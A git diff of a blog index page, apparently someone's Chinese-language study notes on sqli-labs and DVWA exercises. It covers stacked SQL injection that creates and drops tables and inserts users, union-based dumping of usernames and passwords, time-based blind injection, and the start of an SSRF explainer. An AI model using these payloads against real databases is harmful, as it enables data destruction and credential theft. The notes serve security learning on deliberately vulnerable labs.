+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| Tables_in_security |</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| emails|</span><br><span class="line"></span><br><span class="line">| referers|</span><br><span class="line"></span><br><span class="line">| uagents|</span><br><span class="line"></span><br><span class="line">| users|</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-Less-43-报错型-堆叠注入-字符型-POST"><a href="#6-Less-43-报错型-堆叠注入-字符型-POST" class="headerlink" title="6.Less-43 报错型 - 堆叠注入 - 字符型 - POST"></a>6.Less-43 报错型 - 堆叠注入 - 字符型 - POST</h2><p>（1）源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);</span><br><span class="line"></span><br><span class="line">$password = $_POST[&quot;login_password&quot;];</span><br><span class="line"></span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE username=(&#x27;$username&#x27;) and password=(&#x27;$password&#x27;)&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>（2）测试</p>
+<p>登录前测创建表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username ： admin</span><br><span class="line"></span><br><span class="line">password：  c&#x27;);create table less43 like users#</span><br></pre></td></tr></table></figure>
+
+<p>登录后查看增加表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| Tables_in_security |</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| emails|</span><br><span class="line"></span><br><span class="line">| less43|</span><br><span class="line"></span><br><span class="line">| referers|</span><br><span class="line"></span><br><span class="line">| uagents|</span><br><span class="line"></span><br><span class="line">| users|</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>登录前测试删除表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username ：admin</span><br><span class="line"></span><br><span class="line">password ： c&#x27;);drop table less43#</span><br></pre></td></tr></table></figure>
+
+<p>登录后查看删除表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| Tables_in_security |</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| emails|</span><br><span class="line"></span><br><span class="line">| referers|</span><br><span class="line"></span><br><span class="line">| uagents|</span><br><span class="line"></span><br><span class="line">| users|</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-Less-44-盲注-堆叠注入-字符型-POST"><a href="#6-Less-44-盲注-堆叠注入-字符型-POST" class="headerlink" title="6.Less-44 盲注 - 堆叠注入 - 字符型 - POST"></a>6.Less-44 盲注 - 堆叠注入 - 字符型 - POST</h2><p>（1）源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username=mysqlirealescapestring(username=mysqlirealescapestring(con1, POST[“loginuser”]);POST[“loginuser”]); password =</span><br><span class="line"></span><br><span class="line">POST[“loginpassword”];POST[“loginpassword”]; sql = &quot;SELECT * FROM users WHERE</span><br><span class="line"></span><br><span class="line">username=&#x27;username′andpassword=′username′andpassword=′password’”;</span><br></pre></td></tr></table></figure>
+
+<p>（2）测试（盲注）</p>
+<p>登录前测试插入表和值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username ： admin</span><br><span class="line"></span><br><span class="line">password ： a&#x27;;insert into users(id,username,password) values (&#x27;144&#x27;,&#x27;less44&#x27;,&#x27;hello&#x27;)#</span><br></pre></td></tr></table></figure>
+
+<p>登录后查看增加表和值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">| id  | username | password   |</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">|   1 | Dumb     | Dumb       |</span><br><span class="line"></span><br><span class="line">|   2 | Angelina | I-kill-you |</span><br><span class="line"></span><br><span class="line">|   3 | Dummy    | p@ssword   |</span><br><span class="line"></span><br><span class="line">|   4 | secure   | crappy     |</span><br><span class="line"></span><br><span class="line">|   5 | stupid   | stupidity  |</span><br><span class="line"></span><br><span class="line">|   6 | superman | genious    |</span><br><span class="line"></span><br><span class="line">|   7 | batman   | mob!le     |</span><br><span class="line"></span><br><span class="line">|   8 | admin    | admin      |</span><br><span class="line"></span><br><span class="line">|   9 | admin1   | admin1     |</span><br><span class="line"></span><br><span class="line">|  10 | admin2   | admin2     |</span><br><span class="line"></span><br><span class="line">|  11 | admin3   | admin3     |</span><br><span class="line"></span><br><span class="line">|  12 | dhakkan  | dumbo      |</span><br><span class="line"></span><br><span class="line">|  14 | admin4   | admin4     |</span><br><span class="line"></span><br><span class="line">|  38 | less38   | hello      |</span><br><span class="line"></span><br><span class="line">|  39 | less39   | hello      |</span><br><span class="line"></span><br><span class="line">| 109 | hello| hello      |</span><br><span class="line"></span><br><span class="line">|  40 | less40   | hello      |</span><br><span class="line"></span><br><span class="line">| 110 | less41| hello      |</span><br><span class="line"></span><br><span class="line">| 144 | less44| hello      |</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">19 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h2 id="7-Less-45-报错型堆叠注入-字符型-POST"><a href="#7-Less-45-报错型堆叠注入-字符型-POST" class="headerlink" title="7.Less-45 报错型堆叠注入 - 字符型 - POST"></a>7.Less-45 报错型堆叠注入 - 字符型 - POST</h2><p>（1）源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);</span><br><span class="line"></span><br><span class="line">$password = $_POST[&quot;login_password&quot;];</span><br><span class="line"></span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE username=(&#x27;$username&#x27;) and password=(&#x27;$password&#x27;)&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>（2）测试</p>
+<p>登录前测试增加表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username :  admin</span><br><span class="line"></span><br><span class="line">password :  c&#x27;);create table less45 like users#   //创建了less45表</span><br></pre></td></tr></table></figure>
+
+<p>登录后查看增加表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| Tables_in_security |</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| emails|</span><br><span class="line"></span><br><span class="line">| less45|</span><br><span class="line"></span><br><span class="line">| referers|</span><br><span class="line"></span><br><span class="line">| uagents|</span><br><span class="line"></span><br><span class="line">| users|</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>登录前测试删除表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username： admin</span><br><span class="line"></span><br><span class="line">password ： c&#x27;);drop table less45#</span><br></pre></td></tr></table></figure>
+
+<p>登录后查看删除表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| Tables_in_security |</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| emails|</span><br><span class="line"></span><br><span class="line">| referers|</span><br><span class="line"></span><br><span class="line">| uagents|</span><br><span class="line"></span><br><span class="line">| users|</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/" data-id="cmawck7ik003grk7kf6ff3hf6" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-Web/注入漏洞/反序列化/反序列化详解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/" class="article-date">
@@ -240,108 +468,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/" data-id="cmawcfx9q003fcg7k6bch8mzs" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/注入漏洞/SQL注入/基础注入流程" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="基础注入流程"><a href="#基础注入流程" class="headerlink" title="基础注入流程"></a>基础注入流程</h1><h2 id="SQL注入流程"><a href="#SQL注入流程" class="headerlink" title="SQL注入流程"></a>SQL注入流程</h2><pre><code>**1、寻找注入点：**
-
-	和数据库有交互  ？aa=bbb
-
-**2、判断闭合方式(依靠数字型不需要闭合，字符型需要闭合）**
-
-	?id=1asdf  看是否报错：有报错：数字型  无报错：字符型
-</code></pre>
-<p>方法二：判断出注入类型涉及到了后续的注入过程中需不需要闭合单引号(‘)，通过“1and 1&#x3D;1#”和“1’and 1&#x3D;2#”进行判断，如果页面有不同的变化，则说明是字符型的注入，因为字符型的参数是需要引号引起来的。</p>
-<pre><code>**3、再判断闭合方式**
-
-	?id=1asdf&#39; 通过 () “” ‘’ 必须两两互相匹配的道理来判断闭合的方式
-</code></pre>
-<blockquote>
-<p>select * from users where id&#x3D;’1asdf’ – ‘ limit 0,1</p>
-</blockquote>
-<pre><code>**4、判断数据库有几列以及回显位**
-</code></pre>
-<blockquote>
-<p>?id &#x3D; 1’ order by 3 –+来实现判断这个数据库有几列  （–+是注释的意思）<br><img src="/.com//image-20250113172420-37zqzqi.png" alt="image">order by即通过第几列排序的意思</p>
-</blockquote>
-<pre><code>	?id=-1&#39; union select1,2,3 --+ 我们改成-1是为了前面不查询类容用union展示，这个也是为了判断回显位
-
- **获取数据库名 ： security**​​
-</code></pre>
-<blockquote>
-<p>将回显位改为database()  ?id&#x3D;-1’ union select1,database(),3 –+</p>
-</blockquote>
-<pre><code>**获取表名 ：emails，less39，referers，uagents，users**
-</code></pre>
-<blockquote>
-<p>?id=1’union select 1,2,group_concat(table_name) from information_schema.t<br> ables where table_schema=database()</p>
-</blockquote>
-<blockquote>
-<p>?id&#x3D;-1’ union select1,(select group<a href>_concat(table</a>_name) from information_schema.tables where table_schema&#x3D;’security’ ),3 –+</p>
-</blockquote>
-<pre><code>**group_concat:**  把它合并成一个字符串
-
-**tables_name:**  表名
-
-**information_schema:**  MYSQL下的一个数据库
-</code></pre>
-<p>‍</p>
-<pre><code>**获取列名：获取users表的列名：id，username，password**
-</code></pre>
-<blockquote>
-<p>?id&#x3D;-1’ union select 1,(select group_concat(column_name) from information_schema.columns where tables_schema&#x3D;’security’ and table_name &#x3D; ‘users’),3 –+</p>
-</blockquote>
-<pre><code>**获取具体数据：**
-</code></pre>
-<blockquote>
-<p>?id &#x3D; -1’ union select 1,(select group_concat(username) from users),3 –+</p>
-</blockquote>
-<p>‍</p>
-<h3 id="取库名："><a href="#取库名：" class="headerlink" title="取库名："></a>取库名：</h3><blockquote>
-<p>?id&#x3D;-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata–+</p>
-</blockquote>
-<h3 id="取表名："><a href="#取表名：" class="headerlink" title="取表名："></a>取表名：</h3><blockquote>
-<p>?id&#x3D;-1’ union select1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’,3 –+</p>
-</blockquote>
-<h3 id="取列名："><a href="#取列名：" class="headerlink" title="取列名："></a>取列名：</h3><blockquote>
-<p>?id&#x3D;-1’ union select1,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’,3 –+</p>
-</blockquote>
-<h3 id="取密码，用户名："><a href="#取密码，用户名：" class="headerlink" title="取密码，用户名："></a>取密码，用户名：</h3><blockquote>
-<p>?id&#x3D;-1’ union select1,group_concat(password) from security.users,3 –+</p>
-</blockquote>
-<h3 id="拼接用户名和密码"><a href="#拼接用户名和密码" class="headerlink" title="拼接用户名和密码"></a>拼接用户名和密码</h3><blockquote>
-<p><strong>concat_ws(‘~’,A,B)</strong>  拼接 A~B</p>
-</blockquote>
-<blockquote>
-<p>?id&#x3D;-1’ union select1,group_concat(concat_ws(‘~’,username,password)) from security.users,3 –+</p>
-</blockquote>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/" data-id="cmawcfx9q003gcg7k70rr0s7q" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/" data-id="cmawck7il003lrk7kfbru58sw" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -405,7 +532,42 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/union%20%E6%B3%A8%E5%85%A5/" data-id="cmawcfx9s003ocg7kb5n9dehl" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/union%20%E6%B3%A8%E5%85%A5/" data-id="cmawck7in003trk7k30ft2lv4" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/注入漏洞/SQL注入/sql注入总结/时间盲注" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>​<code>Timing Attack注入，也就是时间盲注</code>​。通过简单的条件语句比如 and 1=2 是无法看出异常的。</p>
+<p>在MySQL中，有一个<code>Benchmark()</code>​函数，它是用于测试性能的。Benchmark(count,expr) ，这个函数执行的结果，是将表达式 expr 执行 count 次 。</p>
+<p>因此，利用benchmark函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，可以判断注入语句是否执行成功。这是一种边信道攻击，这个技巧在盲注中被称为<code>Timing Attack</code>​，也就是时间盲注。</p>
+<p>利用前提：<u><strong>页面上没有显示位</strong></u>​<u>，</u>​<u><strong>也没有输出 SQL 语句执行错误信息</strong></u>​<u>。</u>​<u><strong>正确的 SQL 语句和错误的 SQL 语句返回页面都一样</strong></u>​<u>，</u>​<u><strong>但是加入 sleep(5)条件之后</strong></u>​<u>，</u>​<u><strong>页面的返回速度明显慢了 5 秒</strong></u>​<u>。</u></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//判断是否存在延时注入</span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and sleep(5) --+</span></span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" data-id="cmawck7iu0044rk7kc1m4b6n2" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -460,42 +622,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/" data-id="cmawcfxa0003wcg7kfupz8ggu" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/注入漏洞/SQL注入/sql注入总结/时间盲注" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>​<code>Timing Attack注入，也就是时间盲注</code>​。通过简单的条件语句比如 and 1=2 是无法看出异常的。</p>
-<p>在MySQL中，有一个<code>Benchmark()</code>​函数，它是用于测试性能的。Benchmark(count,expr) ，这个函数执行的结果，是将表达式 expr 执行 count 次 。</p>
-<p>因此，利用benchmark函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，可以判断注入语句是否执行成功。这是一种边信道攻击，这个技巧在盲注中被称为<code>Timing Attack</code>​，也就是时间盲注。</p>
-<p>利用前提：<u><strong>页面上没有显示位</strong></u>​<u>，</u>​<u><strong>也没有输出 SQL 语句执行错误信息</strong></u>​<u>。</u>​<u><strong>正确的 SQL 语句和错误的 SQL 语句返回页面都一样</strong></u>​<u>，</u>​<u><strong>但是加入 sleep(5)条件之后</strong></u>​<u>，</u>​<u><strong>页面的返回速度明显慢了 5 秒</strong></u>​<u>。</u></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//判断是否存在延时注入</span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and sleep(5) --+</span></span><br></pre></td></tr></table></figure>
-
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" data-id="cmawcfxa8004mcg7keajxd1fo" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/" data-id="cmawck7iy004ark7k1mdvcu3g" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -713,7 +840,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" data-id="cmawcfx8p0000cg7k4nvo6cf8" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" data-id="cmawck7hk0004rk7kbeby9e94" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -868,7 +995,172 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" data-id="cmawcfx8x0005cg7k5um61gsa" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" data-id="cmawck7hl0005rk7k52h7d29j" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/SSRF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/SSRF/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="一、SSRF是什么？"><a href="#一、SSRF是什么？" class="headerlink" title="一、SSRF是什么？"></a>一、SSRF是什么？</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p>
+<p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
+<hr>
+<h2 id="二、SSRF漏洞原理"><a href="#二、SSRF漏洞原理" class="headerlink" title="二、SSRF漏洞原理"></a>二、SSRF漏洞原理</h2><p><span data-type="text" style="background-color: var(--b3-card-info-background); color: var(--b3-card-info-color);">SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</span></p>
+<p><img src="/.com//image-20250520025641-k2sfyci.png" alt="image"></p>
+<p>比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p>
+<hr>
+<h2 id="三、SSRF漏洞挖掘"><a href="#三、SSRF漏洞挖掘" class="headerlink" title="三、SSRF漏洞挖掘"></a>三、SSRF漏洞挖掘</h2><p>1、分享：通过URL地址分享网页内容</p>
+<p><img src="/.com//image-20250520025700-u9pjgmi.png" alt="image"></p>
